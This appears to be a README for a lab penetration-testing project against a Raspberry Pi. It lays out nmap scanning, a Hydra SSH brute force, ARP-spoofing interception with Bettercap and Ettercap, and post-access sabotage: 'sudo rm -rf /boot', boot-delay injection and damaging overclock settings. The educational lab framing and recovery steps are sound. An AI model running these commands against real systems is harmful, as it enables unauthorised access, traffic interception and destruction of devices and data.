## Project Overview

This project covers:
- Man-in-the-Middle (MITM) attacks using Bettercap, Ettercap & Wireshark
- Network discovery and scanning techniques
- SSH access and privilege escalation
- Boot partition inspection and manipulation
- Destructive testing and recovery procedures
- Boot delay injection attacks
- Hardware overclocking attacks
- File system manipulation

---

## Setup

1. Flash and install the 64-bit Raspbian operating system to an SD card using an SD card reader.
2. Connect the Raspberry Pi (Raspberry Pi 4 Model B) to a monitor, keyboard, and power.
3. Use a Kali Linux virtual machine (VMware) to perform the penetration tests.

## Attack Techniques

### Network Discovery & Scanning

**Basic Network Discovery:**

Discover devices on the network:
```bash
arp -a
```

**Network Scanning:**

Scan hosts and services:
```bash
arp -a
nmap -Pn 192.168.XX.X
```

These commands locate active targets and services for further exploitation.

### Brute-force Attack (Hydra)

Create `username` and `password` lists (two text documents). Example files: `username.txt` and `password.txt` (these files included the correct credentials used in the test: `CSE` / `CSE`).

Run Hydra against SSH:
```bash
hydra -L <path_to_username_list> -P <path_to_password_list> ssh://<target_ip>
```

### Man-in-the-Middle (MITM) Attacks

**Bettercap Setup and Usage:**

Install Bettercap:
```bash
sudo apt install bettercap
```

Launch Bettercap with elevated privileges:
```bash
sudo bettercap
```

In-session commands for ARP spoofing:
```bash
net.show
set arp.spoof.targets 192.168.121.174
arp.spoof on
net.sniff on
```

**Ettercap GUI Method:**

Launch Ettercap with GUI:
```bash
ettercap -G
```

Follow GUI workflow:
1. Scan the network for hosts
2. Select target(s)
3. Start ARP poisoning
4. Monitor intercepted traffic

**Wireshark Analysis:**

Launch Wireshark for packet analysis:
```bash
wireshark
```

These steps allow interception and observation of network traffic originating from the Raspberry Pi target.

### SSH Access & Boot Partition Inspection

**Boot Partition Inspection:**

After obtaining SSH access, inspect the boot partition:
```bash
ls -lah /boot/firmware
```

**‚ö†Ô∏è DESTRUCTIVE TEST (Lab Environment Only):**

In a controlled test environment, critical boot files can be removed:
```bash
sudo rm -rf /boot
```

**WARNING**: This renders the device unbootable. Recovery requires:
1. Reimaging the SD card
2. Reinstalling Raspbian OS

### Boot Delay Injection & File Editing

**Availability Attack - Boot Delay:**

Append boot delay to configuration:
```bash
echo "boot_delay=60" | sudo tee -a /path/to/config.txt
```

**System File Modification:**

Edit system files:
```bash
sudo nano /path/to/file.txt
```

**Impact**: These modifications can produce multi-hour boot delays, demonstrating how attackers can impact system availability through configuration file manipulation.

### Overclocking & Hardware Impact

**‚ö†Ô∏è DANGEROUS - Lab Testing Only:**

Modify `/boot/config.txt` with aggressive overclocking settings:
```bash
sudo nano /boot/config.txt
```

Add the following dangerous settings:
```
force_turbo=1
over_voltage=8
arm_freq=2400
gpu_freq=850
```

**Results Observed:**
- Excessive heat generation
- System instability
- Failure to reboot
- Potential hardware damage

**Risk Assessment**: Demonstrates thermal and hardware risks from unsafe configuration changes.

## Safety and Recovery Procedures

### Recovery Methods

1. **SD Card Recovery:**
   - Reimage SD card with fresh OS
   - Restore from backup if available

2. **Configuration Rollback:**
   - Boot from recovery mode
   - Restore original config files
   - Remove malicious modifications

3. **Hardware Reset:**
   - Remove power completely
   - Allow cooling period for overheated components
   - Check for physical damage
